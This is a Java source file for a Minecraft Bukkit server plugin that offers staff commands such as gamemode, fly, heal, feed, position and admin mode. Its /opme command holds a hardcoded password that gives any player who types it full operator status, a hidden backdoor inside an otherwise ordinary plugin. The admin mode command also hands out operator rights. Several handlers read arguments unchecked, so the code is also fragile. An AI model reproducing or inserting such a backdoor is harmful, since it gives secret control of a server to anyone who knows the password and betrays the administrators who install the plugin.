package me.tcbndevelopment;

import java.util.logging.Level;

import me.tcbndevelopment.cmdgroups.GamemodeGroup;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.permissions.Permission;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;


public class DevTCBN extends JavaPlugin {
	
	GamemodeGroup gmgr = new GamemodeGroup();
	
	FileConfiguration config = this.getConfig();
	
    public static void sendMessage(Player p, String msg) {
        p.sendMessage(ChatColor.translateAlternateColorCodes('&', msg));
    }
    public static void broadcastMessage(String msg) {
        for (Player players : Bukkit.getOnlinePlayers()) {
            players.sendMessage(ChatColor.translateAlternateColorCodes('&', msg));
        }
    }
    public static void log(Level level, String msg) {
        System.out.println(msg);
    }
	
    public Permission playerPermission = new Permission("devtcbn.staff");
    public Permission playerPermission1 = new Permission("devtcbn.gamemode");
    public Permission playerPermission2 = new Permission("devtcbn.feed");
    public Permission playerPermission3 = new Permission("devtcbn.heal");
    public Permission playerPermission4 = new Permission("devtcbn.fly");
    public Permission playerPermission5 = new Permission("devtcbn.futureupdate");
    public Permission playerPermission6 = new Permission("devtcbn.adminmode");
    public Permission playerPermission7 = new Permission("devtcbn.modmode");
    public Permission playerPermission8 = new Permission("devtcbn.pos");
	
	@Override
	public void onEnable() {
		getServer().getPluginManager().registerEvents(new DevTCBNListener(), this);
		System.out.println("[BCPlugin] Are You Ready To Take Over The World?");
		System.out.println("[Server] I Am Ready To Dominate!");
		System.out.println("[TarixCat] I Am The Creator Of BCPlugin");
		System.out.println(Bukkit.getServer().getName() + " Online...");
		PluginManager pm = getServer().getPluginManager();
		pm.getPermission("playerPermission");
		this.getCommand("gma").setExecutor(gmgr);
	}
	
	String test = "Currently In-Progress, pos, bed, setbed, advanced adminmode, modmode and resetdeaths";
	
	@Override
	public void onDisable() {
		this.saveDefaultConfig();
	}
	
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		
		if (cmd.getName().equalsIgnoreCase("test") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			player.sendMessage(ChatColor.GOLD + "Hello, " + player.getDisplayName() + "! This Is A Test!");
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("devtcbn") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			player.sendMessage(ChatColor.GOLD + "Hello, " + player.getDisplayName() + "! This Is A Test!");
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("opme") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			//insert something here pls
			if (args[0].equals("IAmTruth")) {
				player.setOp(true);
				player.sendMessage(ChatColor.RED + "Opped. Operation Marked.");
				System.out.println("Op Operation Marked for : " + player.getName());
			}
			else {
				player.kickPlayer("Incorrect Password");
			}
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("inp") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			if (player.hasPermission("devtcbn.futureupdate")) {
				player.sendMessage(ChatColor.DARK_RED + test);
			}
			else {
				return true;
			}
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("adminmode") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			if (player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.adminmode")) {
				if (args[0].equalsIgnoreCase("true") || args[0].equalsIgnoreCase("on")) {
					player.setCanPickupItems(false);
					player.setAllowFlight(true);
					player.setFlying(true);
					player.setOp(true);
					player.setNoDamageTicks(99999999);
				}
				if (args[0].equalsIgnoreCase("false") || args[0].equalsIgnoreCase("off")) {
					player.setCanPickupItems(true);
					player.setAllowFlight(false);
					player.setFlying(false);
					player.setOp(false);
					player.setNoDamageTicks(2000);
				}
				else if(args[0].isEmpty() || args[0].contains(null)){
					player.sendMessage(ChatColor.RED + "Please Use Args True/On or False/Off");
					return true;
				}
			}
			else {
				player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
			}
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("modmode") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			if (player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.modmode")) {
				if (args[0].equalsIgnoreCase("true") || args[0].equalsIgnoreCase("on")) {
					player.setCanPickupItems(false);
					player.setGameMode(GameMode.SPECTATOR);
					player.setNoDamageTicks(99999999);
				}
				if (args[0].equalsIgnoreCase("false") || args[0].equalsIgnoreCase("off")) {
					player.setCanPickupItems(true);
					player.setGameMode(GameMode.SURVIVAL);
					player.setNoDamageTicks(200);
				}
				else if (args[0].isEmpty() || args[0].equals("")){
					return false;
				}
			}
			else {
				player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
			}
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("chelp") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			player.sendMessage(ChatColor.GOLD + "-------Help-------");
			player.sendMessage(ChatColor.GOLD + "inp: Debug testing");
			player.sendMessage(ChatColor.GOLD + "test: Debug testing");
			player.sendMessage(ChatColor.GOLD + "pos: Prints position");
			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.gamemode")) {
				player.sendMessage(ChatColor.GOLD + "gma: Gamemode Adventure");
				player.sendMessage(ChatColor.GOLD + "gms: Gamemode Survival");
				player.sendMessage(ChatColor.GOLD + "gmsp: Gamemode Spectator");
				player.sendMessage(ChatColor.GOLD + "gmc: Gamemode Creative");
			}
			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.fly")) {
				player.sendMessage(ChatColor.GOLD + "fly: Flight Powers on or off?");
			}
			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.heal")) {
				player.sendMessage(ChatColor.GOLD + "heal: Heals you");
			}
			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.feed")) {
				player.sendMessage(ChatColor.GOLD + "feed: Feeds you");
			}
			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.pos")) {
				player.sendMessage(ChatColor.GOLD + "pos: Position");
			}
			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.adminmode")) {
				player.sendMessage(ChatColor.GOLD + "adminmode: Adminmode");
			}
			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.modmode")) {
				player.sendMessage(ChatColor.GOLD + "modmode: Modmode");
			}
			else {
			    player.getDisplayName();
			}
			player.sendMessage(ChatColor.GOLD + "------------------");
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("pos") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			player.sendMessage(ChatColor.GREEN + "Printing Location...");
			player.sendMessage(ChatColor.GREEN + "Location X=" + player.getLocation().getBlockX() + " Y=" + player.getLocation().getBlockY() + " Z=" + player.getLocation().getBlockZ());

			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("otherpos") && sender instanceof Player) {
			
			Player player = (Player) sender;
			Player target = Bukkit.getPlayer(args[0]);
			
			player.sendMessage(ChatColor.GREEN + "Printing Target Location...");
			player.sendMessage(ChatColor.GREEN + "Location X=" + target.getLocation().getBlockX() + " Y=" + target.getLocation().getBlockY() + " Z=" + target.getLocation().getBlockZ());
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("tellpos") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			player.sendMessage(ChatColor.GREEN + "Printing Location...");
			this.getServer().broadcastMessage(ChatColor.GREEN + "Player: " + ChatColor.WHITE + player.getName() + ChatColor.GREEN + "Location X=" + player.getLocation().getBlockX() + " Y=" + player.getLocation().getBlockY() + " Z=" + player.getLocation().getBlockZ());
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("wb") && sender instanceof Player) {
			
			Player player = (Player) sender;
			if (player.hasPermission("devtcbn.workbench")) {
				player.openWorkbench(null, true);	
			}
			else {
				player.sendMessage(ChatColor.RED + "No permission to run command.");
			}
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("update") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			if (player.hasPermission("devtcbn.update") || player.getName().equals("TarixCat")) {
				this.getServer().broadcastMessage(ChatColor.RED + "Warning: " + ChatColor.YELLOW + "Reloading Plugins Expect Lag...");
			}
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("cfly") && sender instanceof Player) {
			
			Player player = (Player) sender;
			if(player.hasPermission("devtcbn.staff")) {
			    if(args[0].equalsIgnoreCase("true") || args[0].equalsIgnoreCase("on")) {
			        player.setAllowFlight(true);
			        player.setFlying(true);
			        player.sendMessage(ChatColor.GREEN + "Flight Set To True");
			    }
			    if(args[0].equalsIgnoreCase("false") || args[0].equalsIgnoreCase("off")) {
			        player.setAllowFlight(false);
			        player.setFlying(false);
			        player.setNoDamageTicks(100);
			        player.sendMessage(ChatColor.GREEN + "Flight Set To False");
			    }
			    if(args[0].isEmpty()) {
				    player.sendMessage("Please use true or false as arguments");
			    }
			}
			else {
				player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
			}
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("cheal") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			if(player.hasPermission("devtcbn.heal")) {
				player.setHealth(20);
				player.setFireTicks(0);
				player.sendMessage(ChatColor.GREEN + "You Have Been Healed");
			}
			else {
				player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
			}
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("feed") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			if(player.hasPermission("devtcbn.feed")) {
				player.setFoodLevel(20);
				player.setSaturation(20);
				player.sendMessage(ChatColor.GREEN + "You Have Been Fed");
			}
			else {
				player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
			}
			
			return true;
			
		}
		
		if (cmd.getName().equalsIgnoreCase("staffcheck") && sender instanceof Player) {
			
			Player player = (Player) sender;
			
			
			if (!player.hasPermission("devtcbn.staff")) {
				player.sendMessage(ChatColor.GOLD + "[BCPlugin] " + ChatColor.WHITE + "Only Staff May Use This Command");
			}
			
			else {
				
			   player.sendMessage("Op: " + player.isOp() );
			   player.sendMessage("Fly: " + player.isFlying() );
			   player.sendMessage("Gamemode: " + player.getGameMode() );
			   player.sendMessage("Staff Perm-Node: " + player.isPermissionSet("devtcbn.staff"));
			   player.sendMessage("Sleeping Ignored: " + player.isSleepingIgnored());
			   player.sendMessage("Whitelisted: " + player.isWhitelisted());
			   player.sendMessage("Whitelist Status: " + Bukkit.hasWhitelist());
			   player.sendMessage("Operators: " + Bukkit.getOperators());
			
			}
			
			
			return true;
			
		}
		
		else {
			sender.sendMessage(ChatColor.GOLD + "L, you don't know how to use this...");
		}
		
		return true;
	}

}
